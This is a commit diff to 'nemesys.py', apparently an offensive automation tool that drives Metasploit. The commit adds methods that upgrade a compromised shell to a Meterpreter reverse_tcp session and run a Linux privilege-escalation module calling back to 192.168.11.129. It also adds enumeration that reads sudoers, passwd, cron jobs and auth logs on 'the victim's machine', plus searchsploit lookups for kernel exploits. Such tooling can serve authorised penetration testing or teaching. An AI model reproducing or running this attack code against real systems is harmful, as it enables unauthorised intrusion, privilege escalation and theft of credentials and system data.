15e193770184c7774e2db580969eae3b9dfcb031
Sergio Sánchez Sánchez <sss4esob@gmail.com>
2024-11-11 22:06:38 +0100

    Implement several improvements

--- nemesys.py
+++ nemesys.py
@@ -1,5 +1,8 @@
 import datetime
 import logging
+import re
+import shlex
+import subprocess
 from pymetasploit3.msfrpc import MsfRpcClient
 import time
 from datetime import datetime
@@ -41,12 +44,68 @@ class Nemesys:
         if exploit_uuid:
             session_id = self._get_session_id(exploit_uuid)
             if session_id:
-                self._enumerate_system(session_id)
+                self.upgrade_session(int(session_id))
+                ##self._enumerate_system(session_id)
                 self._open_shell(session_id)
             else:
                 logger.error("❌ No session was established.")
         else:
             logger.error("❌ Exploit execution failed.")
+
+    
+    def upgrade_session(self, session_id):
+        """
+        Realiza el upgrade de una shell básica a Meterpreter utilizando el módulo 'shell_to_meterpreter'.
+
+        Args:
+            session_id (int): ID de la sesión activa.
+
+        Returns:
+            None
+        """
+        console_id = self.client.consoles.console().cid
+        exploit_module = 'multi/manage/shell_to_meterpreter'
+
+        self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
+        self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
+        self.client.consoles.console(console_id).write(f'set PAYLOAD_OVERRIDE linux/x64/meterpreter/reverse_tcp\n')
+        self.client.consoles.console(console_id).write(f'set PLATFORM_OVERRIDE linux\n')
+        self.client.consoles.console(console_id).write('run\n')
+
+        time.sleep(60)
+
+        output = self.client.consoles.console(console_id).read()
+        print("Resultados obtenidos del upgrade:")
+        print(output['data'])
+
+        self.client.consoles.console(console_id).destroy()
+
+    def post_explotation(self, session_id):
+        """Realiza acciones de post-explotación, recogiendo información relevante.
+
+        Args:
+            client (MsfRpcClient): Cliente de Metasploit.
+            session_id (int): ID de la sesión activa.
+
+        Returns:
+            None: Los resultados se imprimen directamente en la consola.
+        """
+        console_id = self.client.consoles.console().cid
+        #exploit_module = '/linux/local/ufo_privilege_escalation'
+        exploit_module = 'linux/local/ufo_privilege_escalation'
+        self.client.consoles.console(console_id).write(f'use {exploit_module}\n')
+        self.client.consoles.console(console_id).write(f'set SESSION {session_id}\n')
+        self.client.consoles.console(console_id).write('set LHOST 192.168.11.129\n')
+        self.client.consoles.console(console_id).write('set LPORT 4445\n')
+        self.client.consoles.console(console_id).write('run\n')
+
+        time.sleep(60)
+        output = self.client.consoles.console(console_id).read()
+        print("Resultados obtenidos del módulo:")
+        print(output['data'])
+
+        self.client.consoles.console(console_id).destroy()
+
 
     def _run_exploit(self, exploit_name, payload_name, exploit_options, payload_options):
         """Private method to run the specified exploit and return its UUID."""
@@ -138,7 +197,11 @@ class Nemesys:
             self._check_network_configs(session_id, log_file)
             self._inspect_config_files(session_id, log_file)
             self._evaluate_insecure_binaries(session_id, log_file)
-
+            self._identify_elevated_accounts(session_id, log_file)
+            self._scan_for_malware(session_id, log_file)
+            self._inspect_system_logs(session_id, log_file)
+            self._check_installed_packages(session_id, log_file)
+            self._check_selinux_apparmor(session_id, log_file)
             logger.info(f"💀 System enumeration complete ✅ (Results saved in {log_filename})")
 
     def _enumerate_os_and_kernel(self, session_id, log_file):
@@ -152,8 +215,55 @@ class Nemesys:
     def _enumerate_kernel_vulnerabilities(self, session_id, log_file):
         """Identifies kernel vulnerabilities."""
         logger.info("🔍 Identifying kernel vulnerabilities...")
-        self._run_command(session_id, "cat /proc/version", log_file)
+        kernel_version_output = self._run_command(session_id, "cat /proc/version", log_file)
+        if kernel_version_output:
+            kernel_version = kernel_version_output.strip()
+            logger.info(f"Kernel version: {kernel_version}")
+            self._search_kernel_vulnerabilities(kernel_version, log_file)
+        else:
+            logger.warning("❌ Failed to retrieve kernel version from /proc/version")
+        
         logger.info("🔍 Kernel vulnerability identification complete ✅")
+
+    def _search_kernel_vulnerabilities(self, kernel_version, log_file):
+        """Uses searchsploit to find known vulnerabilities for the given kernel version."""
+        logger.info(f"🔍 Searching for kernel vulnerabilities for version: {kernel_version}...")
+        # Clean up the kernel version by extracting only the essential part (e.g., 3.13.0-24)
+        cleaned_kernel_version = self._clean_kernel_version(kernel_version)
+        if cleaned_kernel_version:
+            search_query = f"linux kernel {cleaned_kernel_version}"
+            try:
+                result = self._run_searchsploit(search_query, log_file)
+                if result:
+                    logger.info(f"🔍 searchsploit results for {search_query}:\n{result}")
+            except Exception as e:
+                logger.error(f"❌ Failed to run searchsploit: {e}")
+        else:
+            logger.warning("❌ Invalid or empty kernel version.")
+
+    def _clean_kernel_version(self, kernel_version):
+        """Cleans up the kernel version string to extract only the essential part."""
+        # Regex to match the kernel version pattern and strip out extra information
+        match = re.match(r"Linux version ([0-9]+\.[0-9]+\.[0-9]+-[0-9]+)", kernel_version)
+        if match:
+            return match.group(1)
+        else:
+            return None
+
+    def _run_searchsploit(self, query, log_file):
+        """Runs the searchsploit command and returns the output."""
+        try:
+            command = f"searchsploit {query}"
+            command_list = shlex.split(command)
+            result = subprocess.check_output(command_list, stderr=subprocess.STDOUT)
+            result = result.decode('utf-8')
+            log_file.write(f"Executed command: {command}\n")
+            log_file.write(f"Output: {result}\n\n")
+            return result
+        except subprocess.CalledProcessError as e:
+            return None
+        except Exception as e:
+            return None
 
     def _enumerate_permissions_and_configs(self, session_id, log_file):
         """Enumerates sensitive permissions and configurations."""
@@ -196,16 +306,92 @@ class Nemesys:
         self._run_command(session_id, "gcc --version", log_file)
         logger.info("⚠️ Insecure binaries and vulnerable libraries evaluation complete ✅")
 
+    def _inspect_config_files(self, session_id, log_file):
+        """Inspects sensitive configuration files."""
+        logger.info("🔐 Inspecting sensitive configuration files...")
+        # Check /etc/sudoers
+        self._run_command(session_id, "cat /etc/sudoers", log_file)
+        # Check /etc/fstab
+        self._run_command(session_id, "cat /etc/fstab", log_file)
+        # Check cron jobs
+        self._run_command(session_id, "cat /etc/cron.d/*", log_file)
+        self._run_command(session_id, "cat /etc/cron.daily/*", log_file)
+        logger.info("🔐 Inspection of configuration files complete ✅")
+
+    def _identify_elevated_accounts(self, session_id, log_file):
+        """Identifies accounts with elevated privileges."""
+        logger.info("🔑 Identifying accounts with elevated privileges...")
+        # Check for groups with sudo privileges
+        self._run_command(session_id, "grep 'sudo' /etc/group", log_file)
+        self._run_command(session_id, "grep 'wheel' /etc/group", log_file)
+        # Check if the root user is enabled
+        self._run_command(session_id, "grep 'root' /etc/passwd", log_file)
+        # Check for users with interactive shell
+        self._run_command(session_id, "cat /etc/passwd | grep -E '/bin/bash|/bin/sh'", log_file)
+        logger.info("🔑 Identification of elevated accounts complete ✅")
+
+    def _inspect_file_permissions(self, session_id, log_file):
+        """Inspects permissions on critical files and directories."""
+        logger.info("⚠️ Inspecting permissions on critical files and directories...")
+        self._run_command(session_id, "ls -l /etc/passwd", log_file)
+        self._run_command(session_id, "ls -l /etc/shadow", log_file)
+        self._run_command(session_id, "ls -l /etc/sudoers", log_file)
+        self._run_command(session_id, r"find / -type f -perm -002 -exec ls -l {} \;", log_file)
+        self._run_command(session_id, r"find / -type f -perm -4000 -exec ls -l {} \;", log_file)
+        logger.info("⚠️ Inspection of file permissions complete ✅")
+
+    def _scan_for_malware(self, session_id, log_file):
+        """Scans for malware or rootkits on the system."""
+        logger.info("🔍 Scanning for malware and rootkits...")
+        # Check for rootkits
+        self._run_command(session_id, "chkrootkit", log_file)
+        # Additional rootkit check
+        self._run_command(session_id, "rkhunter --check", log_file)
+        # Check for suspicious temporary files
+        self._run_command(session_id, "find /tmp -type f", log_file)
+        self._run_command(session_id, "find /var/tmp -type f", log_file)
+        logger.info("🔍 Malware and rootkit scan complete ✅")
+
+    def _inspect_system_logs(self, session_id, log_file):
+        """Inspects system logs for suspicious activity."""
+        logger.info("📜 Inspecting system logs...")
+        # Check authentication logs
+        self._run_command(session_id, "cat /var/log/auth.log", log_file)
+        # Check syslog
+        self._run_command(session_id, "cat /var/log/syslog", log_file)
+        # Check messages logs
+        self._run_command(session_id, "cat /var/log/messages", log_file)
+        logger.info("📜 Inspection of system logs complete ✅")
+
+    def _check_installed_packages(self, session_id, log_file):
+        """Checks installed packages and searches for known vulnerabilities."""
+        logger.info("🔍 Reviewing installed packages")
+        # List installed packages (Debian/Ubuntu)
+        #self._run_command(session_id, "dpkg --list", log_file)
+        logger.info("🔍 Review of installed packages ✅")
+
+    def _check_selinux_apparmor(self, session_id, log_file):
+        """Checks the configuration of SELinux or AppArmor."""
+        logger.info("🔐 Checking SELinux/AppArmor configuration...")
+        # Check SELinux status
+        self._run_command(session_id, "getenforce", log_file)
+        # Check AppArmor status
+        self._run_command(session_id, "aa-status", log_file)
+        logger.info("🔐 SELinux/AppArmor configuration check complete ✅")
+
     def _run_command(self, session_id, command, log_file):
         """Runs a command on the victim's machine via the session."""
         shell = self.client.sessions.session(session_id)
         shell.write(command + '\n')
-        time.sleep(1)
+        time.sleep(60)
         output = shell.read()
+        logger.info(f"Executed command: {command}\n")
+        logger.info(f"Output: {output}\n")
+        if output:
+            log_file.write(f"Executed command: {command}\n")
+            log_file.write(f"Output: {output}\n\n")
+        return output
 
-        # Write the command output to the log file
-        log_file.write(f"Executed command: {command}\n")
-        log_file.write(f"Output: {output}\n\n")
 
 def main():
     """Main function that orchestrates the flow using the Nemesys class."""
